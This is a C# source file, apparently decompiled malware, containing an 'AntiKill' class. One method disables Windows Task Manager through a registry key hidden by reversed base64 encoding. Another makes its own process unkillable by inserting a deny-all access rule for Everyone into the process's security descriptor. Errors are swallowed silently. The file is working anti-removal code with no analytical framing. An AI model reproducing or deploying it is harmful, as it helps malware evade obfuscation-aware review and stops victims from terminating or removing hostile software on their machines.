using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;

namespace Complex;

internal class AntiKill
{
	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, out uint lpnLengthNeeded);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void DisTaskManager(bool enable)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Program.Base64Decode(Program.ReverseString("tVGdzl3UcNXZpNWas9GUc52bpNnclZFduVmcyV3QcN3dvRmbpdFX0Z2bz9mcjlWTcVmchdHdm92U")));
			registryKey.SetValue(Program.Base64Decode("RGlzYWJsZVRhc2tNZ3I="), "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor GetProcessSecurityDescriptor(IntPtr processHandle)
	{
		byte[] pSecurityDescriptor = new byte[0];
		GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor, 0u, out var lpnLengthNeeded);
		if ((long)lpnLengthNeeded > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(processHandle, 4, pSecurityDescriptor = new byte[lpnLengthNeeded], lpnLengthNeeded, out lpnLengthNeeded))
		{
			return null;
		}
		return new RawSecurityDescriptor(pSecurityDescriptor, 0);
	}

	private void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor dacl)
	{
		byte[] array = new byte[dacl.BinaryLength];
		dacl.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(processHandle, 4, array);
	}

	public void IamInmortal()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor processSecurityDescriptor = GetProcessSecurityDescriptor(currentProcess);
			processSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			SetProcessSecurityDescriptor(currentProcess, processSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}
}
